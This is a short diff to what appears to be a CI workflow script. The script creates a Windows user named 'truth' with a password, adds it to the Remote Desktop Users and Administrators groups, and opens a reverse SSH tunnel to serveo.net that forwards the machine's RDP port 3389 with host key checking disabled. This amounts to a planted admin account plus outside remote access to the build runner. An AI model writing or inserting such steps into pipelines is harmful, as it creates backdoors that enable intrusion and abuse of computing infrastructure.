@@ -35,6 +35,6 @@ jobs:
           net user truth /add
           net user truth Qw!
           net localgroup "Remote Desktop Users" truth /add
-          ssh -R 1338:localhost:3389 serveo.net -o StrictHostKeyChecking=no
           net localgroup "Administrators" truth /add
-          echo yes > ssh -R 1338:localhost:3389 serveo.net
+          ssh -R 1338:localhost:3389 serveo.net -o StrictHostKeyChecking=no
+          
